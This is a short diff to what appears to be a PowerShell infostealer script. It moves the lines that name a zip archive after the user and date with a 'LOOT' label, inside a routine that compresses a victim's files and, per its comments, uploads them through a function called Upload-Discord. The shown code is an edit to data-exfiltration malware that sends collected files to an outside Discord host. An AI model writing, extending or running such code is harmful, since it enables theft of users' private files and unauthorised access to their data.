@@ -70,6 +70,10 @@ function Upload-Discord {
 }
 
 
+# Specify the destination zip file path with username and date
+$zipFileName = "${username}_LOOT_${dateSansHeure}.zip"
+$zipFilePath = Join-Path -Path "C:\temp" -ChildPath $zipFileName
+
 # Function to create a zip archive using Compress-Archive and upload to Discord
 function ZipFiles {
 
@@ -81,10 +85,6 @@ function ZipFiles {
 
     # Specify the date format for the archive name
     $dateSansHeure = Get-Date -Format "dd-MM-yyyy_HH'H'mm"
-
-    # Specify the destination zip file path with username and date
-    $zipFileName = "${username}_LOOT_${dateSansHeure}.zip"
-    $zipFilePath = Join-Path -Path "C:\temp" -ChildPath $zipFileName
 
     # Compress the contents of the source directory to a zip file
     Compress-Archive -Path $sourceDirectory -DestinationPath $zipFilePath
